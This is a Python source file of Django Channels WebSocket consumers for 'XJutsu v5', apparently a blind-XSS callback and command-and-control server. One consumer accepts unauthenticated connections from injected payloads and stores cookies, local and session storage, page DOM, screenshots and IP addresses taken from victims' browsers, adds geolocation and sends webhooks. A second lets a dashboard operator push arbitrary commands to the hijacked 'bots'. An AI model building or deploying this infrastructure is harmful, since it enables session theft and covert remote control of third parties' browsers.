"""
XJutsu v5 - WebSocket Consumers
Handles real-time XSS payload callbacks
"""

import json
import logging
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from asgiref.sync import sync_to_async
from django.utils import timezone

logger = logging.getLogger(__name__)


class XSSCallbackConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for receiving XSS callback data
    No authentication required - payloads need to connect from anywhere
    """
    
    async def connect(self):
        """
        Handle new WebSocket connection from XSS payload
        """
        self.bot_id = None
        self.room_group_name = 'xss_callbacks'
        
        # Join the broadcast group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )
        
        await self.accept()
        logger.info(f"New XSS callback connection: {self.channel_name}")
    
    async def disconnect(self, close_code):
        """
        Handle WebSocket disconnection
        """
        # Leave broadcast group
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )
        logger.info(f"XSS callback disconnected: {self.bot_id or self.channel_name}")
    
    async def receive(self, text_data):
        """
        Handle incoming messages from XSS payload
        """
        try:
            data = json.loads(text_data)
            event_type = data.get('type', 'unknown')
            
            if event_type == 'register':
                await self.handle_register(data)
            elif event_type == 'callback':
                await self.handle_callback(data)
            elif event_type == 'screenshot':
                await self.handle_screenshot(data)
            elif event_type == 'page_collect':
                await self.handle_page_collect(data)
            elif event_type == 'ping':
                await self.send(text_data=json.dumps({'type': 'pong'}))
            else:
                logger.warning(f"Unknown event type: {event_type}")
                
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON received: {e}")
        except Exception as e:
            logger.error(f"Error processing message: {e}")
    
    async def handle_register(self, data):
        """
        Register a new bot/browser session
        """
        self.bot_id = data.get('bot_id')
        
        # Join bot-specific group for targeted commands
        if self.bot_id:
            await self.channel_layer.group_add(
                f'bot_{self.bot_id}',
                self.channel_name
            )
            
            # Send acknowledgment
            await self.send(text_data=json.dumps({
                'type': 'registered',
                'bot_id': self.bot_id,
                'message': 'Connected to XJutsu v5'
            }))
            
            logger.info(f"Bot registered: {self.bot_id}")
    
    async def handle_callback(self, data):
        """
        Handle main XSS callback with captured data
        """
        from hunter.models import Capture, Payload

        payload_data = data.get('payload', {})

        # Get client IP from scope
        client_ip = None
        if 'client' in self.scope:
            client_ip = self.scope['client'][0]

        # Extract payload ID if present
        payload_id = payload_data.get('payload_id')
        payload_obj = None

        if payload_id:
            payload_obj = await self.get_payload(payload_id)

        # Extract tracking ID (from scanner)
        tracking_id = payload_data.get('tracking_id', '')

        # Create capture record
        capture = await self.create_capture(
            payload=payload_obj,
            bot_id=self.bot_id or payload_data.get('bot_id', 'unknown'),
            tracking_id=tracking_id,
            uri=payload_data.get('uri', ''),
            origin=payload_data.get('origin', ''),
            referrer=payload_data.get('referrer', ''),
            cookies=payload_data.get('cookies', ''),
            localstorage=json.dumps(payload_data.get('localstorage', {})),
            sessionstorage=json.dumps(payload_data.get('sessionstorage', {})),
            dom=payload_data.get('dom', ''),
            page_links=json.dumps(payload_data.get('page_links', [])),
            ip_address=client_ip,
            user_agent=payload_data.get('user_agent', ''),
            browser_info=payload_data.get('browser_info', ''),
        )

        # Auto-verify XSS if tracking_id matches a scan injection point
        if tracking_id:
            await self.verify_xss_from_scan(capture, tracking_id)
        
        # Broadcast to dashboard
        await self.channel_layer.group_send(
            'dashboard',
            {
                'type': 'new_capture',
                'capture': {
                    'id': str(capture.id),
                    'uri': capture.uri,
                    'domain': capture.domain,
                    'bot_id': capture.bot_id,
                    'ip_address': capture.ip_address,
                    'fired_at': capture.fired_at.isoformat(),
                }
            }
        )
        
        # Send webhooks
        await self.send_notifications(capture)
        
        # Acknowledge receipt
        await self.send(text_data=json.dumps({
            'type': 'callback_received',
            'capture_id': str(capture.id)
        }))
        
        logger.info(f"New capture from {capture.uri} - ID: {capture.short_id}")
    
    async def handle_screenshot(self, data):
        """
        Handle screenshot upload (separate from main callback for size)
        """
        from hunter.models import Capture
        
        capture_id = data.get('capture_id')
        screenshot_data = data.get('screenshot', '')
        
        if capture_id and screenshot_data:
            await self.update_capture_screenshot(capture_id, screenshot_data)
            
            await self.send(text_data=json.dumps({
                'type': 'screenshot_received',
                'capture_id': capture_id
            }))
            
            logger.info(f"Screenshot received for capture: {capture_id}")
    
    async def handle_page_collect(self, data):
        """
        Handle collected page HTML from target
        """
        from hunter.models import Capture, CollectedPage
        
        capture_id = data.get('capture_id')
        page_uri = data.get('uri', '')
        page_html = data.get('html', '')
        
        if capture_id and page_html:
            await self.create_collected_page(capture_id, page_uri, page_html)
            
            logger.info(f"Page collected: {page_uri}")
    
    async def execute_command(self, event):
        """
        Send command to the connected bot/payload
        """
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command'],
            'args': event.get('args', {})
        }))
    
    @database_sync_to_async
    def get_payload(self, payload_id):
        from hunter.models import Payload
        try:
            return Payload.objects.get(id=payload_id, is_active=True)
        except Payload.DoesNotExist:
            return None
    
    @database_sync_to_async
    def create_capture(self, **kwargs):
        from hunter.models import Capture
        return Capture.objects.create(**kwargs)
    
    @database_sync_to_async
    def update_capture_screenshot(self, capture_id, screenshot_data):
        from hunter.models import Capture
        Capture.objects.filter(id=capture_id).update(screenshot=screenshot_data)
    
    @database_sync_to_async
    def create_collected_page(self, capture_id, uri, html_content):
        from hunter.models import Capture, CollectedPage
        try:
            capture = Capture.objects.get(id=capture_id)
            CollectedPage.objects.create(
                capture=capture,
                uri=uri,
                html_content=html_content
            )
        except Capture.DoesNotExist:
            pass

    @database_sync_to_async
    def verify_xss_from_scan(self, capture, tracking_id):
        """
        Auto-verify XSS by linking capture to scan injection point
        """
        from hunter.models import ScanInjectionPoint, ScanTarget
        from django.utils import timezone

        try:
            # Find injection point with this tracking ID
            injection_point = ScanInjectionPoint.objects.get(tracking_id=tracking_id)

            # Mark as verified
            injection_point.is_verified = True
            injection_point.verified_at = timezone.now()
            injection_point.capture = capture
            injection_point.save()

            # Update scan stats
            scan = injection_point.scan
            scan.verified_xss = ScanInjectionPoint.objects.filter(
                scan=scan, is_verified=True
            ).count()
            scan.save()

            logger.info(f"AUTO-VERIFIED XSS: {injection_point.param} @ {injection_point.url}")

        except ScanInjectionPoint.DoesNotExist:
            # No matching injection point - might be manual payload
            pass
        except Exception as e:
            logger.error(f"Error verifying XSS: {e}")
    
    async def send_notifications(self, capture):
        """
        Send webhook notifications for new capture
        """
        from hunter.notifications import NotificationService
        from hunter.geoip import GeoIPService
        
        # Enrich with GeoIP data
        if capture.ip_address:
            geo = await sync_to_async(GeoIPService.lookup)(capture.ip_address)
            capture.country = geo.get('country', '')
            capture.city = geo.get('city', '')
            if geo.get('lat') and geo.get('lon'):
                capture.geolocation = f"{geo['lat']},{geo['lon']}"
            await sync_to_async(capture.save)(update_fields=['country', 'city', 'geolocation'])
        
        # Send notifications
        await NotificationService.send_all_notifications(capture)


class DashboardConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for the dashboard - receives real-time updates
    Requires authentication
    """
    
    async def connect(self):
        """
        Handle dashboard WebSocket connection
        """
        # Check if user is authenticated
        user = self.scope.get('user')
        if not user or not user.is_authenticated:
            await self.close()
            return
        
        self.user = user
        self.room_group_name = 'dashboard'
        
        # Join dashboard group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )
        
        await self.accept()
        logger.info(f"Dashboard connected: {user.username}")
    
    async def disconnect(self, close_code):
        """
        Handle dashboard disconnection
        """
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )
    
    async def receive(self, text_data):
        """
        Handle commands from dashboard
        """
        try:
            data = json.loads(text_data)
            command = data.get('command')
            
            if command == 'send_to_bot':
                await self.send_command_to_bot(data)
                
        except json.JSONDecodeError:
            pass
    
    async def send_command_to_bot(self, data):
        """
        Send a command to a specific bot
        """
        bot_id = data.get('bot_id')
        command = data.get('bot_command')
        args = data.get('args', {})
        
        if bot_id and command:
            await self.channel_layer.group_send(
                f'bot_{bot_id}',
                {
                    'type': 'execute_command',
                    'command': command,
                    'args': args
                }
            )
    
    async def new_capture(self, event):
        """
        Broadcast new capture to dashboard
        """
        await self.send(text_data=json.dumps({
            'type': 'new_capture',
            'capture': event['capture']
        }))
    
    async def bot_status(self, event):
        """
        Broadcast bot status update
        """
        await self.send(text_data=json.dumps({
            'type': 'bot_status',
            'bot_id': event['bot_id'],
            'status': event['status']
        }))
